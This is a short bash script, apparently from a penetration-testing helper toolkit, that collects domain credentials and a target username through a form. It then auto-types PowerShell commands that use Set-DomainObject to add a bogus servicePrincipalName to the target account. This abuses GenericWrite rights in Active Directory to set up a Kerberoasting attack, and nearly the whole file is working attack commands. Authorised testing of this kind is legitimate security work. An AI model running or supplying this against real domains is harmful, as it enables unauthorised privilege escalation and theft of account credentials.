#!/bin/bash

: '
powershell: genericWrite permissions exploit
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DOMAIN_FIELD=$(form_item  "domain" "domain")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")
REQUEST_USER_FIELD=$(form_item  "request user" "request_user")

# Generate GUI form
generate_form "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}" "${REQUEST_USER_FIELD}"

DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}
REQUEST_USER=${form_data["request_user"]}

paste_command "\$SecPassword = ConvertTo-SecureString '${PASSWORD}' -AsPlainText -Force"
xdotool key Return
sleep 1.5

paste_command "\$Cred = New-Object System.Management.Automation.PSCredential('${DOMAIN}\\${USERNAME}', \$SecPassword)"
xdotool key Return
sleep 1.5

paste_command "Set-DomainObject -credential \$Cred -Identity ${REQUEST_USER} -SET @{serviceprincipalname='pentesting/LEGIT'} -Verbose"
xdotool key Return
